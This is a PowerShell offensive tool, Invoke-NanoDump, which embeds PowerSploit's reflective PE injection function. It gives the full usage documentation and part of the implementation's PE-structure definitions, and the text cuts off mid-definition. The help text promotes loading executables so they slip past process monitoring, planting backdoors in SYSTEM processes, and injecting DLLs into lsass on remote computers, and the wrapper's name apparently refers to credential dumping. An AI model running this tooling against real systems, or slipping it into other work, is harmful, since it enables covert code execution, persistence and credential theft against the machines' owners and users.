Function Invoke-NanoDump {

    function Invoke-ReflectivePEInjection {
        <#
    .SYNOPSIS
    
    This script has two modes. It can reflectively load a DLL/EXE in to the PowerShell process,
    or it can reflectively load a DLL in to a remote process. These modes have different parameters and constraints,
    please lead the Notes section (GENERAL NOTES) for information on how to use them.
    
    1.)Reflectively loads a DLL or EXE in to memory of the Powershell process.
    Because the DLL/EXE is loaded reflectively, it is not displayed when tools are used to list the DLLs of a running process.
    
    This tool can be run on remote servers by supplying a local Windows PE file (DLL/EXE) to load in to memory on the remote system,
    this will load and execute the DLL/EXE in to memory without writing any files to disk.
    
    2.) Reflectively load a DLL in to memory of a remote process.
    As mentioned above, the DLL being reflectively loaded won't be displayed when tools are used to list DLLs of the running remote process.
    
    This is probably most useful for injecting backdoors in SYSTEM processes in Session0. Currently, you cannot retrieve output
    from the DLL. The script doesn't wait for the DLL to complete execution, and doesn't make any effort to cleanup memory in the
    remote process.
    
    PowerSploit Function: Invoke-ReflectivePEInjection  
    Author: Joe Bialek, Twitter: @JosephBialek  
    Code review and modifications: Matt Graeber, Twitter: @mattifestation  
    License: BSD 3-Clause  
    Required Dependencies: None  
    Optional Dependencies: None  
    
    .DESCRIPTION
    
    Reflectively loads a Windows PE file (DLL/EXE) in to the powershell process, or reflectively injects a DLL in to a remote process.
    
    .PARAMETER PEBytes
    
    A byte array containing a DLL/EXE to load and execute.
    
    .PARAMETER ComputerName
    
    Optional, an array of computernames to run the script on.
    
    .PARAMETER FuncReturnType
    
    Optional, the return type of the function being called in the DLL. Default: Void
        Options: String, WString, Void. See notes for more information.
        IMPORTANT: For DLLs being loaded remotely, only Void is supported.
    
    .PARAMETER ExeArgs
    
    Optional, arguments to pass to the executable being reflectively loaded.
    
    .PARAMETER ProcName
    
    Optional, the name of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.
    
    .PARAMETER ProcId
    
    Optional, the process ID of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.
    
    .PARAMETER ForceASLR
    
    Optional, will force the use of ASLR on the PE being loaded even if the PE indicates it doesn't support ASLR. Some PE's will work with ASLR even
        if the compiler flags don't indicate they support it. Other PE's will simply crash. Make sure to test this prior to using. Has no effect when
        loading in to a remote process.
    
    .PARAMETER DoNotZeroMZ
    
    Optional, will not wipe the MZ from the first two bytes of the PE. This is to be used primarily for testing purposes and to enable loading the same PE with Invoke-ReflectivePEInjection more than once.
    
    .EXAMPLE
    
    Load DemoDLL and run the exported function WStringFunc on Target.local, print the wchar_t* returned by WStringFunc().
    $PEBytes = [IO.File]::ReadAllBytes('DemoDLL.dll')
    Invoke-ReflectivePEInjection -PEBytes $PEBytes -FuncReturnType WString -ComputerName Target.local
    
    .EXAMPLE
    
    Load DemoDLL and run the exported function WStringFunc on all computers in the file targetlist.txt. Print
        the wchar_t* returned by WStringFunc() from all the computers.
    $PEBytes = [IO.File]::ReadAllBytes('DemoDLL.dll')
    Invoke-ReflectivePEInjection -PEBytes $PEBytes -FuncReturnType WString -ComputerName (Get-Content targetlist.txt)
    
    .EXAMPLE
    
    Load DemoEXE and run it locally.
    $PEBytes = [IO.File]::ReadAllBytes('DemoEXE.exe')
    Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4"
    
    .EXAMPLE
    
    Load DemoEXE and run it locally. Forces ASLR on for the EXE.
    $PEBytes = [IO.File]::ReadAllBytes('DemoEXE.exe')
    Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4" -ForceASLR
    
    .EXAMPLE
    
    Refectively load DemoDLL_RemoteProcess.dll in to the lsass process on a remote computer.
    $PEBytes = [IO.File]::ReadAllBytes('DemoDLL_RemoteProcess.dll')
    Invoke-ReflectivePEInjection -PEBytes $PEBytes -ProcName lsass -ComputerName Target.Local
    
    .NOTES
    GENERAL NOTES:
    The script has 3 basic sets of functionality:
    1.) Reflectively load a DLL in to the PowerShell process
        -Can return DLL output to user when run remotely or locally.
        -Cleans up memory in the PS process once the DLL finishes executing.
        -Great for running pentest tools on remote computers without triggering process monitoring alerts.
        -By default, takes 3 function names, see below (DLL LOADING NOTES) for more info.
    2.) Reflectively load an EXE in to the PowerShell process.
        -Can NOT return EXE output to user when run remotely. If remote output is needed, you must use a DLL. CAN return EXE output if run locally.
        -Cleans up memory in the PS process once the DLL finishes executing.
        -Great for running existing pentest tools which are EXE's without triggering process monitoring alerts.
    3.) Reflectively inject a DLL in to a remote process.
        -Can NOT return DLL output to the user when run remotely OR locally.
        -Does NOT clean up memory in the remote process if/when DLL finishes execution.
        -Great for planting backdoor on a system by injecting backdoor DLL in to another processes memory.
        -Expects the DLL to have this function: void VoidFunc(). This is the function that will be called after the DLL is loaded.
    
    DLL LOADING NOTES:
    
    PowerShell does not capture an applications output if it is output using stdout, which is how Windows console apps output.
    If you need to get back the output from the PE file you are loading on remote computers, you must compile the PE file as a DLL, and have the DLL
    return a char* or wchar_t*, which PowerShell can take and read the output from. Anything output from stdout which is run using powershell
    remoting will not be returned to you. If you just run the PowerShell script locally, you WILL be able to see the stdout output from
    applications because it will just appear in the console window. The limitation only applies when using PowerShell remoting.
    
    For DLL Loading:
    Once this script loads the DLL, it may call a function in the DLL if you specified a -FuncReturnType parameter other than None.
    If you haven't, all the script will do is to load up a DLL, launch it DllMain and leave all the rest to the code in DllMain 
    that hopefully will handle DLL_PROCESS_ATTACH / DLL_THREAD_ATTACH event and do the job locally. This is how the msfvenom generates it's DLLs, 
    they all start up from DllMain not from any export. 
    
    In case you have specified -FuncReturnType other than None, this script will call an exported from DLL function - with the name alike to return type.
    There is a section near the bottom labeled "YOUR CODE GOES HERE"
    I recommend your DLL take no parameters. I have prewritten code to handle functions which take no parameters are return
    the following types: char*, wchar_t*, and void. If the function returns char* or wchar_t* the script will output the
    returned data. The FuncReturnType parameter can be used to specify which return type to use. The mapping is as follows:
    wchar_t*   : FuncReturnType = WString
    char*      : FuncReturnType = String
    void       : Default, don't supply a FuncReturnType
    
    For the whcar_t* and char_t* options to work, you must allocate the string to the heap. Don't simply convert a string
    using string.c_str() because it will be allocaed on the stack and be destroyed when the DLL returns.
    
    The function name expected in the DLL for the prewritten FuncReturnType's is as follows:
    WString    : WStringFunc
    String     : StringFunc
    Void       : VoidFunc
    
    These function names ARE case sensitive. To create an exported DLL function for the wstring type, the function would
    be declared as follows:
    extern "C" __declspec( dllexport ) wchar_t* WStringFunc()
    
    
    If you want to use a DLL which returns a different data type, or which takes parameters, you will need to modify
    this script to accomodate this. You can find the code to modify in the section labeled "YOUR CODE GOES HERE".
    
    Find a DemoDLL at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectiveDllInjection
    
    .LINK
    
    http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/
    
    Blog on modifying mimikatz for reflective loading: http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
    Blog on using this script as a backdoor with SQL server: http://www.casaba.com/blog/
    #>
    
        [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseApprovedVerbs', '')]
        [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseSingularNouns', '')]
        [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
        [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
        [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSPossibleIncorrectComparisonWithNull', '')]
        [CmdletBinding()]
        Param(
            [Parameter(Position = 0, Mandatory = $true)]
            [ValidateNotNullOrEmpty()]
            [Byte[]]
            $PEBytes,
    
            [Parameter(Position = 1)]
            [String[]]
            $ComputerName,
    
            [Parameter(Position = 2)]
            [ValidateSet( 'WString', 'String', 'Void', 'None' )]
            [String]
            $FuncReturnType = 'None',
    
            [Parameter(Position = 3)]
            [String]
            $ExeArgs,
    
            [Parameter(Position = 4)]
            [Int32]
            $ProcId,
    
            [Parameter(Position = 5)]
            [String]
            $ProcName,
    
            [Switch]
            $ForceASLR,
    
            [Switch]
            $DoNotZeroMZ
        )
    
        Set-StrictMode -Version 2
    
    
        $RemoteScriptBlock = {
            [CmdletBinding()]
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [Byte[]]
                $PEBytes,
    
                [Parameter(Position = 1, Mandatory = $true)]
                [String]
                $FuncReturnType,
    
                [Parameter(Position = 2, Mandatory = $true)]
                [Int32]
                $ProcId,
    
                [Parameter(Position = 3, Mandatory = $true)]
                [String]
                $ProcName,
    
                [Parameter(Position = 4, Mandatory = $true)]
                [Bool]
                $ForceASLR,
    
                [Parameter(Position = 5, Mandatory = $true)]
                [String]
                $ExeArgs
            )
        
            ###################################
            ##########  Win32 Stuff  ##########
            ###################################
            Function Get-Win32Types {
                $Win32Types = New-Object System.Object
    
                #Define all the structures/enums that will be used
                #   This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
                $Domain = [AppDomain]::CurrentDomain
                $DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
                $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
                $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
                $ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    
    
                ############    ENUM    ############
                #Enum MachineType
                $TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
                $TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
                $TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
                $TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
                $TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
                $MachineType = $TypeBuilder.CreateType()
                $Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType
    
                #Enum MagicType
                $TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
                $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
                $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
                $MagicType = $TypeBuilder.CreateType()
                $Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType
    
                #Enum SubSystemType
                $TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
                $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
                $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
                $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
                $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
                $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
                $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
                $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
                $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
                $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
                $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
                $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
                $SubSystemType = $TypeBuilder.CreateType()
                $Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType
    
                #Enum DllCharacteristicsType
                $TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
                $TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
                $TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
                $TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
                $TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
                $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
                $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
                $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
                $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
                $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
                $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
                $TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
                $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
                $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
                $DllCharacteristicsType = $TypeBuilder.CreateType()
                $Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType
    
                ###########    STRUCT    ###########
                #Struct IMAGE_DATA_DIRECTORY
                $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
                $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
            ($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
            ($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
                $IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
                $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY
    
                #Struct IMAGE_FILE_HEADER
                $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
                $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
                $TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
                $TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
                $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
                $TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
                $TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
                $TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
                $TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
                $IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
                $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER
    
                #Struct IMAGE_OPTIONAL_HEADER64
                $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
                $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
            ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
            ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
            ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
            ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
            ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
            ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
            ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
            ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
            ($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
            ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
            ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
            ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
            ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
            ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
            ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
            ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
            ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
            ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
            ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
            ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
            ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
            ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
            ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
            ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
            ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
            ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
            ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
            ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
            ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
            ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
            ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
            ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
            ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
            ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
            ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
            ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
            ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
            ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
            ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
            ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
            ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
            ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
            ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
            ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
            ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
                $IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
                $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64
    
                #Struct IMAGE_OPTIONAL_HEADER32
                $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
                $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
            ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
            ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
            ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
            ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
            ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
            ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
            ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
            ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
            ($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
            ($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
            ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
            ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
            ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
            ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
            ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
            ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
            ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
            ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
            ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
            ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
            ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
            ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
            ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
            ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
            ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
            ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
            ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
            ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
            ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
            ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
            ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
            ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
            ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
            ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
            ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
            ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
            ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
            ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
            ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
            ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
            ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
            ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
            ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
            ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
            ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
            ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
                $IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
                $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32
    
                #Struct IMAGE_NT_HEADERS64
                $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
                $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
                $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
                $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
                $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
                $IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
                $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
    
                #Struct IMAGE_NT_HEADERS32
                $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
                $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
                $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
                $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
                $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
                $IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
                $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32
    
                #Struct IMAGE_DOS_HEADER
                $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
                $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
                $TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
                $TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
                $TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
                $TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
                $TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
                $TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
                $TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
                $TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
                $TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
                $TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
                $TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
                $TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
                $TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
                $TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null
    
